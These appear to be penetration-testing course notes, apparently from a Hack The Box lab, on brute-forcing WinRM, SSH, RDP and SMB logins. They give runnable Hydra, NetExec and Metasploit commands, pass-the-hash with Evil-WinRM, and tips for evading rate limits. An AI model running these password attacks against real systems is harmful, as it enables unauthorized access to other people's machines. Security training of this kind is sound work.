# 08 — Network Services

## Overview

Network services like WinRM, SSH, RDP, and SMB all use username/password authentication by default. During penetration tests, these services are prime targets for password attacks using tools like **NetExec**, **Hydra**, **Evil-WinRM**, and **Metasploit**.

---

## Service Summary

| Service | Default Port(s) | Protocol | Platform | Brute Force Tool(s) |
|---------|-----------------|----------|----------|----------------------|
| WinRM | 5985 (HTTP), 5986 (HTTPS) | TCP | Windows | NetExec, Evil-WinRM |
| SSH | 22 | TCP | Linux/Windows | Hydra |
| RDP | 3389 | TCP/UDP | Windows | Hydra |
| SMB | 445 | TCP | Windows/Linux (Samba) | Hydra, NetExec, Metasploit |

---

## WinRM (Windows Remote Management)

- Microsoft's implementation of WS-Management (SOAP-based XML web services)
- Communicates between WBEM and WMI, can call DCOM
- Must be **manually activated** on Windows 10/11
- Ports: **5985** (HTTP), **5986** (HTTPS)

### NetExec

```bash
# Install
sudo apt-get -y install netexec

# General usage
netexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>

# Brute force WinRM
netexec winrm 10.129.42.197 -u user.list -p password.list
```
> NetExec supports multiple protocols with the same syntax. Pass a single username/password string or a file path. `(Pwn3d!)` in the output means the account can execute commands. Swap `winrm` for `smb`, `ssh`, `ldap`, etc.

**Key indicator:** `(Pwn3d!)` in output means you can likely execute system commands.

### Evil-WinRM

```bash
# Install
sudo gem install evil-winrm

# Connect
evil-winrm -i <target-IP> -u <username> -p <password>
```
> Opens an interactive PowerShell session via Windows Remote Management. Replace `-p` with `-H NTLM_HASH` for pass-the-hash. Requires WinRM to be enabled on the target (port 5985 or 5986).

- Initializes a terminal session using **PowerShell Remoting Protocol (MS-PSRP)**

---

## SSH (Secure Shell)

- Default port: **22**
- Uses three cryptography methods:

| Method | Description |
|--------|-------------|
| **Symmetric Encryption** | Same key for encrypt/decrypt; key exchanged via Diffie-Hellman (AES, Blowfish, 3DES) |
| **Asymmetric Encryption** | Public/private key pair; private key decrypts messages encrypted with public key |
| **Hashing** | One-way algorithm to confirm message authenticity |

### Hydra — SSH

```bash
hydra -L user.list -P password.list ssh://10.129.42.197
```
> `-L` takes a username list file, `-P` takes a password list file. Hydra tries every combination. Add `-t 4` to limit parallel tasks and avoid getting locked out or rate-limited by the SSH server.

> **Note:** SSH servers often limit parallel connections. Use `-t 4` to reduce parallel tasks.

### SSH Login

```bash
ssh user@10.129.42.197
```
> Connects to the target over Secure Shell (SSH). Replace `user` with the found username. Add `-i keyfile` to use a private key instead of a password.

---

## RDP (Remote Desktop Protocol)

- Default port: **3389** (TCP/UDP)
- Application layer protocol for remote GUI access to Windows
- Exchanges image, sound, keyboard, pointing device data
- Can redirect printers and storage media

### Hydra — RDP

```bash
hydra -L user.list -P password.list rdp://10.129.42.197
```
> Brute-forces Remote Desktop Protocol (RDP) on port 3389. Use `-t 1` to avoid connection failures from RDP's rate limiting. Successful credentials can then be used with `xfreerdp`.

> **Warning:** RDP doesn't like many parallel connections. Use `-t 1` or `-t 4` and `-W 1` or `-W 3` for delays.

**Output note:** `account might be valid but not active for remote desktop` = valid creds but user not in Remote Desktop Users group.

### xFreeRDP — Connect

```bash
xfreerdp /v:<target-IP> /u:<username> /p:<password>
```
> Connects to a Windows Remote Desktop. Add `/cert:ignore` for self-signed certificates, `/dynamic-resolution` to resize the window, and `+clipboard` to enable clipboard sharing.

---

## SMB (Server Message Block)

- Default port: **445**
- File/directory sharing and printing services in Windows networks
- Also known as **CIFS** (Common Internet File System)
- **Samba** = open-source implementation for Linux/macOS

### Hydra — SMB

```bash
hydra -L user.list -P password.list smb://10.129.42.197
```
> Brute-forces Server Message Block (SMB) on port 445. Older Hydra versions fail against SMBv3 — if you see `invalid reply from target`, switch to Metasploit's `smb_login` module or NetExec.

> **Known issue:** Older Hydra versions can't handle SMBv3 replies → `[ERROR] invalid reply from target`. Fix: update/recompile Hydra or use Metasploit.

### Metasploit — SMB Login

```bash
msfconsole -q
use auxiliary/scanner/smb/smb_login
set user_file user.list
set pass_file password.list
set rhosts 10.129.42.197
run
```
> Metasploit's SMB login scanner handles SMBv3 correctly and tries all user/password combinations. `-q` starts msfconsole without the banner. Use this when Hydra fails on modern Windows targets.

### NetExec — Enumerate Shares

```bash
netexec smb 10.129.42.197 -u "user" -p "password" --shares
```
> Lists accessible SMB shares after confirming valid credentials. Shows share names, types, and access level. Follow up with `smbclient` to browse specific shares.

### Smbclient — Access Shares

```bash
smbclient -U user \\\\10.129.42.197\\SHARENAME
```
> Connects to a specific SMB share. The double-backslash escaping is needed in bash. Once connected, use `ls`, `get`, `put`, and `cd` to navigate and transfer files.

---

## Quick Reference — Brute Force Commands

| Service | Command |
|---------|---------|
| WinRM | `netexec winrm <IP> -u user.list -p password.list` |
| SSH | `hydra -L user.list -P password.list ssh://<IP>` |
| RDP | `hydra -L user.list -P password.list rdp://<IP>` |
| SMB | `hydra -L user.list -P password.list smb://<IP>` |
| SMB (alt) | `netexec smb <IP> -u user.list -p password.list` |
| SMB (MSF) | `auxiliary/scanner/smb/smb_login` |

---

## Key Takeaways

- **NetExec** is the go-to multi-protocol tool — supports WinRM, SMB, LDAP, MSSQL, RDP, SSH, FTP, NFS, VNC, WMI
- `(Pwn3d!)` in NetExec output = you can execute commands on the target
- **Hydra** works for SSH, RDP, and SMB but has SMBv3 compatibility issues
- **Evil-WinRM** gives a PowerShell session after successful WinRM auth
- RDP and SMB don't like many parallel connections — reduce threads with `-t`
- Use `--shares` with NetExec to enumerate SMB shares after finding valid creds
- HTB recommends running attacks from **Pwnbox** for speed; download wordlists from the attached `network-services.zip`
